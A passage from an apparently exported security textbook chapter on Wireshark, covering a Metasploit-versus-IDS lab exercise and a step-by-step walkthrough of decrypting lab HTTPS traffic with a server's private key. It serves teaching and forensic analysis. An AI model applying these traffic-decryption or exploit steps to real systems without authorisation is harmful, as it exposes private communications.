style="margin-top:7.6500pt;margin-right:26.8500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l18 level1 lfo20;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Knowing your exploits are being monitored by the IDS, return</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to Metasploit to try prior exploits or new ones. Return to the ELK system and search to find your malicious</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.6000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >activities.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section273" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1><a name="_bookmark531" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><a name="Chapter 7: Decrypting TLS, Capturing USB" ></a><a name="_bookmark532" ></a>Chapter 7</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoNormal  style="margin-top:0.3500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:24.5000pt;" >Decrypting TLS, Capturing USB, Keyloggers, and Network</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:2.7000pt;font-weight:bold;font-size:24.5000pt;" >&nbsp;</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:24.5000pt;" >Graphing</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></p><p class=MsoBodyText  style="margin-top:15.3000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In this chapter, we visit a few other features of Wireshark. We start by walking through how to decrypt SSL/TLS. Encrypted traffic provides little insight into the data, apart from routing information, so this task can be useful for inspecting suspect activity. The next topic focuses on sniffing USB traffic. The reasons for capturing traffic over a USB port ranges from troubleshooting a USB-specific problem to forensic analysis. We show how to perform USB captures on both Linux and Windows, and then demonstrate how Wireshark can analyze the capture as you would a network capture, and even how to write a simple keylogger using TShark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark533" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Decrypting SSL/TLS" ></a>Decrypting SSL/TLS</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When an analyst or researcher performs network packet captures, encrypted traffic can quickly become blinding and hide the inner workings of a connection. Once again, however, Wireshark has you covered. Wireshark comes with built-in support for some of the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >most common encrypted protocols you will likely encounter on modern networks. We go over decrypting SSL/TLS, which is by far one of the most common encrypted network protocols</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >today.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You use SSL/TLS every time you browse to an HTTPS site. The protocol started its life as Secure Sockets Layer (SSL) but was later renamed to Transport Layer Security (TLS) after modifying the protocol and fixing issues with the <a name="_bookmark534" ></a>original SSL protocol. People</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >often use SSL and TLS interchangeably. Current versions of SSL are considered insecure and should be replaced with TLS. And during a packet capture, while the Wireshark dissector may correctly interpret the protocol as TLS, certain dialog boxes might still refer to the protocol as SSL, as we will see later in the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.7500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >chapter.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="131.083"  height="0" ></td></tr><tr><td></td><td><img width="758"  height="4"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker353457.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section274" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:449.0000px;" ><img width="763"  height="449"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker353485.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:6.0000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The TLS protocol supports various cipher suites, or means of encryption. This is deciding dynamically between the client and the server based on what either end supports. The inner workings of TLS can get rather complex. An entire chapter (even a book!) could be written on the details of the TLS protocols and the various nuisances regarding the security it provides. Instead, we are going to try and take a nice, high-level view of how TLS works, and then work through a practical example of how to perform TLS decryption with Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >TLS is considered a hybrid cryptosystem in that it utilizes both</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.2500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >symmetric </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >asymmetric </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >encryption.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:8.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Symmetric encryption is what you think of when you hear encryption. It means that a single key gets used for both decryption and encryption. The issue with symmetric encryption is that you have a secret key that has to be shared. Of course, it&#8217;s very difficult to securely share a key on an insecure network such as the public network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Asymmetric encryption helps to solve this problem. With asymmetric encryption, there is both a private and a public key. Anything encrypted with the private key can only be decrypted with the public key, and vice versa; anything encrypted with the public key can only be decrypted by the private key. So, to securely share a key, the client can</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section275" ><p class=MsoBodyText  style="margin-top:3.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >encrypt a key with the server&#8217;s public key. This way, the only person who can decrypt this message is the server that has their own private key. The server then uses this passed-on key to perform symmetric encryption of the transmitted data. You may be wondering why we don&#8217;t just use asymmetric encryption during the whole process. The reason is that symmetric encryption generally provides better security and, more importantly, is much faster than asymmetric encryption.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="523"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker355287.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.3500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Decrypting SSL/TLS Using Private Keys</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now that you have a basic understanding of TLS, let&#8217;s look at how to decrypt the traffic. We know that the key will be encrypted with the public key of the server (the web server in the case of HTTP).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Therefore, you need to access the private key from the server to figure out the symmetric encryption key to actually decrypt the application data. If you don&#8217;t have the lab started, fire it up and start Wireshark on the host machine listening on the w4sp_lab interface. Once the lab is up and Wireshark is capturing packets, browse to </span><span><a href="https://ftp1.labs/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >https://ftp1.labs</span></u></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(see<a name="_bookmark536" ></a>&nbsp;</span><span><a href="#_bookmark537" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-1</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). If you get a certificate error, click that you understand</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section276" ><p class=MsoBodyText  style="margin-top:3.5500pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the risk and add an exception, and then check the box to permanently store the exception.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="489"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker356119.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark537" ></a><span><a href="#_bookmark536" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-1:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Browsing to ftp1.labs</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:8.0500pt;" ><a name="_bookmark538" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >ssl </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >into the filter window, you should be able to quickly drill into the HTTPS traffic that you just generated. The word &#8220;ssl&#8221; must be typed in the filter, even though Wireshark correctly recognizes the traffic as TLS. If you right-click on a packet and click Follow TCP Stream, you see that it is mostly a bunch of garbage (see<a name="_bookmark539" ></a>&nbsp;</span><span><a href="#_bookmark540" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.3000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As mentioned earlier, you need the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ftp1.labs </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >private key. This is provided within the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >w4sp_lab/images/ftp_tel/</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >directory and is named </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >apache.key</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section277" ><p class=MsoBodyText  style="margin-left:21.5000pt;" ><img width="735"  height="573"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker356720.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark540" ></a><span><a href="#_bookmark539" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-2:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Follow TCP stream on SSL/TLS traffic</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To use </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >apache.key </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to decrypt the SSL/TLS traffic, you have to tell Wireshark where the key is located, as well as which traffic can be decrypted using that key.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Return back to the Wireshark GUI. Click Edit and select Preferences, and then expand the Protocols section. Then type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >ssl </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >anywhere while the Preferences window is active to see the SSL protocol options (see<a name="_bookmark541" ></a>&nbsp;</span><span><a href="#_bookmark542" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). Note that Wireshark, as an application, uses the acronym SSL, but as mentioned earlier, the protocol has been replaced by TLS.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section278" ><p class=MsoBodyText ><img width="783"  height="558"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker357345.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:3.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark542" ></a><span><a href="#_bookmark541" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-3:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Wireshark SSL/TLS protocol options</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >From here, click Edit for the RSA keys list, and select New, which opens another small window. The first box to fill out on this new window is the IP address. This will be the IP address of the TLS server</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:8.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8212;the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ftp1.labs </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >HTTPS server in this case. For the lab instance used for these figures, the IP address of the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ftp1.labs </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >server was </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.100.200.147</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Keep in mind that your </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ftp1.labs </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >server may have a different IP address, so make sure to double-check and use the correct IP address. The next box to fill in is the port. This is easy, because it is TCP port 443, the standard default port for HTTPS. The next box is for the Protocol. This tells Wireshark what kind of data is being encrypted with <a name="_bookmark543" ></a>the TLS stream. You are using an HTTPS server, so the underlying protocol is going to be HTTP. The next option is for the key file. Clicking this opens a file dialog that allows you to pick the TLS server private key. Again, you want to select the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >apache.key</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file located in the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >w4sp_lab/images/ftp_tel</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.9500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >directory (see<a name="_bookmark544" ></a>&nbsp;</span><span><a href="#_bookmark545" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). The last box is for encrypted private keys and is where you would place the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section279" ><p class=MsoBodyText  style="margin-top:3.5500pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >password to decrypt this file. In our example, the private key is not encrypted, so you can leave this blank.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="193.75"  height="0" ></td></tr><tr><td></td><td><img width="633"  height="447"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker358676.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark545" ></a><span><a href="#_bookmark544" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-4:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Setting up SSL/TLS decryption</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:5.7500pt;" ><a name="_bookmark546" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With all this information filled out, you can start clicking the OK buttons to start closing out all the preference windows, leading you back to the main Wireshark UI. At this point, you should note that the packet list refreshed and you can now see some HTTP traffic in Wireshark. If, for some reason, you don&#8217;t see any HTTP traffic, double- check that you have captured the Client and Server Hello, as well as a Client Key Exchange SSL/TLS packet. Try refreshing the page a few times or closing out of the browser and opening the </span><span><a href="https://ftp1.labs/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >https://ftp1.labs</span></u></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >page to make sure you capture the full SSL/TLS handshake. To further test decryption, you can right-click a TLS packet in Wireshark and select the Follow SSL Stream option (see<a name="_bookmark547" ></a>&nbsp;</span><span><a href="#_bookmark548" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-5</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). This should now open a window similar to what you see when you select Follow TCP Stream, and should be showing the decrypted HTTP traffic to the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ftps1.labs</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >site.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
